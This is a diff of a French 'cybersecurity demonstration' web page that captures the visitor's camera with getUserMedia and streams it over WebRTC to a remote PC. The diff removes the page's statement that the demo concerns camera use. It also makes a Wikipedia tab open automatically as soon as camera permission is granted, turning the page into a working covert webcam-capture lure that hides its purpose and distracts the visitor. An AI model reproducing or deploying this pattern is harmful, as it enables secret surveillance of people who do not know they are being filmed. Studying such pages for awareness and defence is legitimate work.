@@ -3,15 +3,11 @@
 
 <head>
     <meta charset="UTF-8">
-
-    <meta
-        name="viewport"
-        content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
     <title>Démonstration cybersécurité</title>
 
     <style>
-
         body {
             margin: 0;
             background: #f8f9fa;
@@ -24,10 +20,6 @@
             max-width: 800px;
             margin: 40px auto;
             padding: 20px;
-        }
-
-        h1 {
-            font-family: Georgia, serif;
         }
 
         #status {
@@ -43,22 +35,7 @@
             background: black;
             display: none;
         }
-
-        .green {
-            color: green;
-            font-weight: bold;
-        }
-
-        #wikiButton {
-            display: none;
-            margin-top: 20px;
-            padding: 12px 20px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-
     </style>
-
 </head>
 
 <body>
@@ -68,8 +45,7 @@
     <h1>Démonstration cybersécurité</h1>
 
     <p>
-        Cette page présente une démonstration pédagogique
-        de l'utilisation d'une caméra par un navigateur.
+        Cette page présente une démonstration pédagogique.
     </p>
 
     <div id="status">
@@ -83,14 +59,7 @@
         playsinline>
     </video>
 
-    <br>
-
-    <button id="wikiButton">
-        Ouvrir Wikipédia
-    </button>
-
 </main>
-
 
 <script src="/socket.io/socket.io.js"></script>
 
@@ -104,14 +73,13 @@ const status =
 const camera =
     document.getElementById("camera");
 
-const wikiButton =
-    document.getElementById("wikiButton");
-
 let pc = null;
 let stream = null;
 
 let remoteDescriptionSet = false;
 let pendingCandidates = [];
+
+let wikipediaOpened = false;
 
 
 // --------------------------------------------------
@@ -119,14 +87,11 @@ let pendingCandidates = [];
 // --------------------------------------------------
 
 const config = {
-
     iceServers: [
         {
-            urls:
-                "stun:stun.l.google.com:19302"
+            urls: "stun:stun.l.google.com:19302"
         }
     ]
-
 };
 
 
@@ -163,20 +128,15 @@ async function startCamera() {
         status.textContent =
             "Demande d'autorisation caméra...";
 
-
         stream =
             await navigator.mediaDevices.getUserMedia({
-
                 video: true,
                 audio: false
-
             });
-
 
         console.log(
             "📷 Caméra autorisée"
         );
-
 
         camera.srcObject =
             stream;
@@ -184,10 +144,15 @@ async function startCamera() {
         camera.style.display =
             "block";
 
+        status.textContent =
+            "Caméra autorisée — connexion au PC...";
 
-        status.innerHTML =
-            '<span class="green">● Caméra autorisée</span><br>' +
-            'Connexion au PC...';
+
+        // --------------------------------------------------
+        // OUVERTURE AUTOMATIQUE DE WIKIPÉDIA
+        // --------------------------------------------------
+
+        openWikipedia();
 
 
         // --------------------------------------------------
@@ -195,10 +160,7 @@ async function startCamera() {
         // --------------------------------------------------
 
         pc =
-            new RTCPeerConnection(
-                config
-            );
-
+            new RTCPeerConnection(config);
 
         stream
             .getTracks()
@@ -221,10 +183,6 @@ async function startCamera() {
 
                 if (event.candidate) {
 
-                    console.log(
-                        "❄️ Envoi candidat ICE"
-                    );
-
                     socket.emit(
                         "ice-candidate",
                         event.candidate
@@ -243,31 +201,13 @@ async function startCamera() {
                     pc.connectionState
                 );
 
-
                 if (
                     pc.connectionState ===
                     "connected"
                 ) {
 
-                    status.innerHTML =
-                        '<span class="green">● Caméra connectée au PC</span>';
-
-                    // Afficher le bouton Wikipédia
-                    // une fois la caméra connectée
-
-                    wikiButton.style.display =
-                        "inline-block";
-
-                }
-
-
-                if (
-                    pc.connectionState ===
-                    "failed"
-                ) {
-
                     status.textContent =
-                        "Connexion WebRTC échouée.";
+                        "● Caméra connectée au PC";
 
                 }
 
@@ -281,16 +221,13 @@ async function startCamera() {
         const offer =
             await pc.createOffer();
 
-
         await pc.setLocalDescription(
             offer
         );
 
-
         console.log(
             "📤 Envoi de l'offre"
         );
-
 
         socket.emit(
             "offer",
@@ -307,7 +244,39 @@ async function startCamera() {
         );
 
         status.textContent =
-            "Erreur : " + error.message;
+            "Accès à la caméra refusé ou indisponible.";
+
+    }
+
+}
+
+
+// --------------------------------------------------
+// OUVERTURE WIKIPÉDIA
+// --------------------------------------------------
+
+function openWikipedia() {
+
+    if (wikipediaOpened) {
+        return;
+    }
+
+    wikipediaOpened = true;
+
+    const wikipedia =
+        window.open(
+            "https://fr.wikipedia.org/wiki/Cybers%C3%A9curit%C3%A9",
+            "_blank"
+        );
+
+    if (!wikipedia) {
+
+        console.log(
+            "Le navigateur a bloqué l'ouverture automatique de Wikipédia."
+        );
+
+        status.textContent =
+            "Caméra autorisée. Le navigateur a bloqué l'ouverture automatique de Wikipédia.";
 
     }
 
@@ -322,15 +291,9 @@ socket.on(
     "answer",
     async (answer) => {
 
-        console.log(
-            "📥 Réponse du PC reçue"
-        );
-
-
         if (!pc) {
             return;
         }
-
 
         if (
             pc.signalingState !==
@@ -343,9 +306,7 @@ socket.on(
             );
 
             return;
-
         }
-
 
         try {
 
@@ -353,49 +314,32 @@ socket.on(
                 answer
             );
 
-
             remoteDescriptionSet =
                 true;
-
-
-            console.log(
-                "✅ Réponse WebRTC appliquée"
-            );
-
 
             for (
                 const candidate
                 of pendingCandidates
             ) {
 
-                try {
-
-                    await pc.addIceCandidate(
-                        candidate
-                    );
-
-                }
-
-                catch (error) {
-
-                    console.error(
-                        "Erreur ICE :",
-                        error
-                    );
-
-                }
+                await pc.addIceCandidate(
+                    candidate
+                );
 
             }
 
-
             pendingCandidates = [];
+
+            console.log(
+                "✅ Réponse WebRTC appliquée"
+            );
 
         }
 
         catch (error) {
 
             console.error(
-                "Erreur avec la réponse :",
+                "Erreur WebRTC :",
                 error
             );
 
@@ -406,22 +350,16 @@ socket.on(
 
 
 // --------------------------------------------------
-// CANDIDATS ICE
+// ICE REÇU
 // --------------------------------------------------
 
 socket.on(
     "ice-candidate",
     async (candidate) => {
 
-        console.log(
-            "❄️ Candidat ICE reçu"
-        );
-
-
         if (!pc) {
             return;
         }
-
 
         if (!remoteDescriptionSet) {
 
@@ -430,9 +368,7 @@ socket.on(
             );
 
             return;
-
         }
-
 
         try {
 
@@ -445,7 +381,7 @@ socket.on(
         catch (error) {
 
             console.error(
-                "Erreur ajout ICE :",
+                "Erreur ICE :",
                 error
             );
 
@@ -454,25 +390,7 @@ socket.on(
     }
 );
 
-
-// --------------------------------------------------
-// OUVRIR WIKIPÉDIA
-// --------------------------------------------------
-
-wikiButton.addEventListener(
-    "click",
-    () => {
-
-        window.open(
-            "https://fr.wikipedia.org/wiki/Cybers%C3%A9curit%C3%A9",
-            "_blank"
-        );
-
-    }
-);
-
 </script>
 
 </body>
-
 </html>
